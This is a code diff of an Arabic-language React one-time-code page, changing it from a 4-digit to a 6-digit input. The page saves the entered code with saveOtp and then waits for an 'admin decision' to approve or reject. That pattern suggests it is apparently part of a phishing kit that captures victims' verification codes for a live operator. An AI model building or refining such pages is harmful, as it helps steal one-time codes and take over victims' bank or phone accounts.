@@ -37,12 +37,11 @@ type PageState = "form" | "waiting" | "approved" | "rejected";
 
 export default function OtpPage() {
   const { navigateTo, navigateBack } = useNavigate();
-  const [otp, setOtp] = useState(["", "", "", ""]);
+  const [otp, setOtp] = useState("");
   const [timeLeft, setTimeLeft] = useState(120);
   const [pageState, setPageState] = useState<PageState>("form");
   const [error, setError] = useState("");
   const [submitted, setSubmitted] = useState(false);
-  const refs = useRef<(HTMLInputElement | null)[]>([]);
   const unsubRef = useRef<(() => void) | null>(null);
 
   useEffect(() => {
@@ -58,24 +57,21 @@ export default function OtpPage() {
 
   const fmt = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;
 
-  const onChange = (i: number, v: string) => {
+  const onChange = (v: string) => {
     if (!/^\d*$/.test(v)) return;
-    const next = [...otp]; next[i] = v.slice(-1); setOtp(next);
-    if (submitted) setError(next.every(d => d) ? "" : "أدخل الرمز المكون من 4 أرقام");
-    if (v && i < 3) refs.current[i + 1]?.focus();
-  };
-  const onKey = (i: number, e: React.KeyboardEvent) => {
-    if (e.key === "Backspace" && !otp[i] && i > 0) refs.current[i - 1]?.focus();
+    const trimmed = v.slice(0, 6);
+    setOtp(trimmed);
+    if (submitted) setError(trimmed.length === 6 ? "" : "أدخل الرمز المكون من 6 أرقام");
   };
 
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
     setSubmitted(true);
     if (timeLeft <= 0) { setError("انتهت مدة الرمز. اضغط على إعادة الإرسال"); return; }
-    if (!otp.every(d => d)) { setError("أدخل الرمز المكون من 4 أرقام"); return; }
+    if (otp.length !== 6) { setError("أدخل الرمز المكون من 6 أرقام"); return; }
 
     setError("");
-    await saveOtp(otp.join("")).catch(console.error);
+    await saveOtp(otp).catch(console.error);
 
     // Switch to waiting screen and start listening for admin decision
     setPageState("waiting");
@@ -94,13 +90,13 @@ export default function OtpPage() {
 
   const handleRetry = () => {
     setPageState("form");
-    setOtp(["", "", "", ""]);
+    setOtp("");
     setSubmitted(false);
     setError("");
     setTimeLeft(120);
   };
 
-  const isComplete = otp.every(d => d !== "");
+  const isComplete = otp.length === 6;
 
   /* ── Waiting for admin ── */
   if (pageState === "waiting") {
@@ -200,33 +196,32 @@ export default function OtpPage() {
         <div className="ab-card" style={{ padding: 28 }}>
           <form onSubmit={submit} noValidate>
             <p style={{ textAlign: "center", color: "#475569", fontSize: 13, lineHeight: 1.7, marginTop: 0, marginBottom: 24 }}>
-              أدخل رمز التأكيد المكون من <strong style={{ color: BLUE }}>4 أرقام</strong><br />المرسل إلى هاتفك المحمول
+              أدخل رمز التأكيد المكون من <strong style={{ color: BLUE }}>6 أرقام</strong><br />المرسل إلى هاتفك المحمول
             </p>
 
-            <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 8, flexDirection: "row-reverse" }}>
-              {otp.map((digit, i) => (
-                <input
-                  key={i}
-                  ref={el => { refs.current[i] = el; }}
-                  type="text" inputMode="numeric" maxLength={1} value={digit}
-                  onChange={e => onChange(i, e.target.value)}
-                  onKeyDown={e => onKey(i, e)}
-                  style={{
-                    width: 58, height: 62, textAlign: "center", fontSize: 24, fontWeight: 800,
-                    borderRadius: 14, border: `2.5px solid ${digit ? BLUE : submitted && error ? "#ef4444" : "#dde4f0"}`,
-                    background: digit ? `linear-gradient(135deg,${BLUE},${BLUE2})` : submitted && error ? "#fff5f5" : "#f8faff",
-                    color: digit ? "white" : BLUE, outline: "none", fontFamily: "'Cairo',sans-serif",
-                    boxShadow: digit ? `0 4px 14px ${BLUE}45` : "none", transition: "all 0.18s",
-                  }}
-                />
-              ))}
+            <div style={{ marginBottom: 8 }}>
+              <input
+                type="text" inputMode="numeric" maxLength={6} value={otp}
+                onChange={e => onChange(e.target.value)}
+                placeholder="• • • • • •"
+                dir="ltr"
+                style={{
+                  width: "100%", height: 64, textAlign: "center",
+                  fontSize: 28, fontWeight: 800, letterSpacing: 12,
+                  borderRadius: 16, border: `2.5px solid ${otp.length === 6 ? BLUE : submitted && error ? "#ef4444" : "#dde4f0"}`,
+                  background: submitted && error && otp.length < 6 ? "#fff5f5" : "#f8faff",
+                  color: BLUE, outline: "none", fontFamily: "monospace",
+                  boxShadow: otp.length === 6 ? `0 4px 18px ${BLUE}35` : "none",
+                  transition: "all 0.18s", boxSizing: "border-box",
+                }}
+              />
             </div>
 
             {error && <p style={{ color: "#ef4444", fontSize: 12, textAlign: "center", fontWeight: 700, margin: "8px 0 0" }}>{error}</p>}
 
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", margin: "20px 0 16px" }}>
               <button type="button" disabled={timeLeft > 0}
-                onClick={() => { setTimeLeft(120); setError(""); setSubmitted(false); setOtp(["", "", "", ""]); }}
+                onClick={() => { setTimeLeft(120); setError(""); setSubmitted(false); setOtp(""); }}
                 style={{ background: "none", border: "none", fontWeight: 700, fontSize: 13, cursor: timeLeft > 0 ? "not-allowed" : "pointer", color: timeLeft > 0 ? "#cbd5e1" : BLUE, fontFamily: "'Cairo',sans-serif" }}>
                 إعادة الإرسال
               </button>
